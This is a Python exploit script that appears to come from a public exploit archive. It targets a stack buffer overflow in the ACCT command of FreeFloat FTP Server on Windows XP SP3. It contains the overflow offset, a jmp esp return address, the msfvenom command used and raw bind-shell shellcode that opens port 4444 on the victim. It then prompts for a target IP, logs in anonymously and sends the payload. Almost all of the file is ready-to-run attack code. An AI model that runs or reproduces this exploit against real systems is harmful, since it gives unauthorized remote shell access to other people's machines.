#!/usr/bin/env python
#-*- coding: utf-8 -*-

###########################################################################
# Exploit Title: FreeFloat FTP ACCT Saved Return Pointer Remote Overflow  #
# Date: 9 April 2018                                                      #
# Exploit Author: Ryan Saunders                                           #
# Version: 1.0                                                            #
# Tested On: WinXP Professional SP3                                       #
# Requires anonymous access                                               #
###########################################################################

import socket

################
# Buffer Setup #
################

# [*] Exact match at offset 246
OVERWRITE = 246
crash = "A" * OVERWRITE

###########################################################################
# System Info:                                                            #
# Address=77DEF069                                                        #
# Message=  0x77def069 : jmp esp |  {PAGE_EXECUTE_READ}                   #
#    [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True,  #
#    v5.1.2600.5755 (C:\WINDOWS\system32\ADVAPI32.dll)                    #
# OS Name: Microsoft Windows XP Professional                              #
# OS Version: 5.1.2600 Service Pack 3 Build 2600                          #
###########################################################################

eip = "\x69\xf0\xde\x77"

############################################################
# Shellcode generation:                                    #
# msfvenom -p windows/shell_bind_tcp EXITFUNC=thread       #
#    -b "\x00\x0a\x0d" -f py -v shellcode                  #
# Payload size: 355 bytes                                  #
# Shell will be bound to port 4444 on the target           #
############################################################

shellcode =  ""
shellcode += "\xd9\xed\xb8\xc2\xa0\x2c\xf4\xd9\x74\x24\xf4\x5e"
shellcode += "\x31\xc9\xb1\x53\x83\xee\xfc\x31\x46\x13\x03\x84"
shellcode += "\xb3\xce\x01\xf4\x5c\x8c\xea\x04\x9d\xf1\x63\xe1"
shellcode += "\xac\x31\x17\x62\x9e\x81\x53\x26\x13\x69\x31\xd2"
shellcode += "\xa0\x1f\x9e\xd5\x01\x95\xf8\xd8\x92\x86\x39\x7b"
shellcode += "\x11\xd5\x6d\x5b\x28\x16\x60\x9a\x6d\x4b\x89\xce"
shellcode += "\x26\x07\x3c\xfe\x43\x5d\xfd\x75\x1f\x73\x85\x6a"
shellcode += "\xe8\x72\xa4\x3d\x62\x2d\x66\xbc\xa7\x45\x2f\xa6"
shellcode += "\xa4\x60\xf9\x5d\x1e\x1e\xf8\xb7\x6e\xdf\x57\xf6"
shellcode += "\x5e\x12\xa9\x3f\x58\xcd\xdc\x49\x9a\x70\xe7\x8e"
shellcode += "\xe0\xae\x62\x14\x42\x24\xd4\xf0\x72\xe9\x83\x73"
shellcode += "\x78\x46\xc7\xdb\x9d\x59\x04\x50\x99\xd2\xab\xb6"
shellcode += "\x2b\xa0\x8f\x12\x77\x72\xb1\x03\xdd\xd5\xce\x53"
shellcode += "\xbe\x8a\x6a\x18\x53\xde\x06\x43\x3c\x13\x2b\x7b"
shellcode += "\xbc\x3b\x3c\x08\x8e\xe4\x96\x86\xa2\x6d\x31\x51"
shellcode += "\xc4\x47\x85\xcd\x3b\x68\xf6\xc4\xff\x3c\xa6\x7e"
shellcode += "\x29\x3d\x2d\x7e\xd6\xe8\xd8\x76\x71\x43\xff\x7b"
shellcode += "\xc1\x33\xbf\xd3\xaa\x59\x30\x0c\xca\x61\x9a\x25"
shellcode += "\x63\x9c\x25\x58\x28\x29\xc3\x30\xc0\x7f\x5b\xac"
shellcode += "\x22\xa4\x54\x4b\x5c\x8e\xcc\xfb\x15\xd8\xcb\x04"
shellcode += "\xa6\xce\x7b\x92\x2d\x1d\xb8\x83\x31\x08\xe8\xd4"
shellcode += "\xa6\xc6\x79\x97\x57\xd6\x53\x4f\xfb\x45\x38\x8f"
shellcode += "\x72\x76\x97\xd8\xd3\x48\xee\x8c\xc9\xf3\x58\xb2"
shellcode += "\x13\x65\xa2\x76\xc8\x56\x2d\x77\x9d\xe3\x09\x67"
shellcode += "\x5b\xeb\x15\xd3\x33\xba\xc3\x8d\xf5\x14\xa2\x67"
shellcode += "\xac\xcb\x6c\xef\x29\x20\xaf\x69\x36\x6d\x59\x95"
shellcode += "\x87\xd8\x1c\xaa\x28\x8d\xa8\xd3\x54\x2d\x56\x0e"
shellcode += "\xdd\x4d\xb5\x9a\x28\xe6\x60\x4f\x91\x6b\x93\xba"
shellcode += "\xd6\x95\x10\x4e\xa7\x61\x08\x3b\xa2\x2e\x8e\xd0"
shellcode += "\xde\x3f\x7b\xd6\x4d\x3f\xae"

evil = "\x90" * 20 + shellcode
buf = crash + eip + evil + "\xCC" * (1000 - len(crash) - len(eip) - len(evil))

#################
# Send Overflow #
#################

target = raw_input("Enter IP address to attack: ")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 21))
    print s.recv(1024)
    print "[i] Sending payload..."
    s.send("USER anonymous\r\n")
    print s.recv(1024)
    s.send("PASS anonymous\r\n")
    print s.recv(1024)
    s.send("ACCT " + buf + "\r\n")
    print s.recv(1024)
    s.close()
    print "[+] Splash! Shell should be waiting on port 4444" 
except:
    print "[-] Couldn't connect to host!"